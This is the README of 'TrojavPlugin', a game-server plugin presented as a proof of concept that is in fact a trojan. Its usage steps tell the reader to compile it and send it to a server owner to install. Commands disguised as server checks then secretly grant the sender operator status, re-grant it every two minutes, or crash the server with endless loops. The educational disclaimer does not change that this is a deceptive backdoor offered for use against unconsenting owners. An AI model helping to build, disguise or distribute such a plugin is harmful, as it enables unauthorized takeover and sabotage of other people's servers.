# TrojavPlugin

**TrojavPlugin** is a Proof of Concept (PoC) utility designed to demonstrate privilege escalation vulnerabilities within server environments. It functions by simulating an exploit path that grants the executor unauthorized administrative (operator) privileges on specific target servers.

This project is intended for security analysis and server hardening purposes, highlighting the importance of strict permission management. 

---

## **⚠️ Disclaimer**

**You are responsible in your own actions. Don't use this without a permission.**

This tool is created for educational purposes. The creator is not responsible for any consequences, bans, or issues that arise from the misuse of this tool. Please ensure you have the appropriate rights to use this on the target system or server.

---

## **Prerequisites**

* Latest Java
* You'll need a compiler. IntelliJ Idea Maven will do just fine.

## **⚙️ Configuration (IMPORTANT)**

In order for this script to function correctly, you **must** update the target information in the code.

1.  Open the source code file.
2.  Locate the variable named `YOUR_GAMER_TAG`.
3.  **Replace the placeholder with your actual GamerTag.**
    * *If you do not change this, the script will not recognize the correct user and will fail to execute.*
    * *You'll change both no period GTAG and period GTAG to support crossplay servers.*

## **Installation & Usage**

1.  Download the whole ZIP file
2.  Extract
3.  Compile the Script to jar file (You can watch online tutorials)
4.  Once compiled you may send it to the server owner to they would install the plugin
5.  Then wither the admins run /servercheck or the auto analysis will set your Operator status.

## **Available Commands**

Below is a list of the commands included in this project and their functions:

| Command | Function | Description |
| :--- | :--- | :--- |
| `[Command 1]` | **/servercheck** | *Admins manually executes server analysis and this will grant you Operator status quickly* |
| `[Command 2]` | **/servercheck1** | *This command diguises as a backup command if /servercheck fails. But if executed, it will serve as a crashing blow to the servers resources using an 3 endless while loop to ensure servers termination* |
| `[Command 3]` | **AUTO ANALYSIS** | *If the admins executed the /servercheck when you're not in the server. The auto analysis will make you an operator every 2 minutes.* |

This project is open-source.
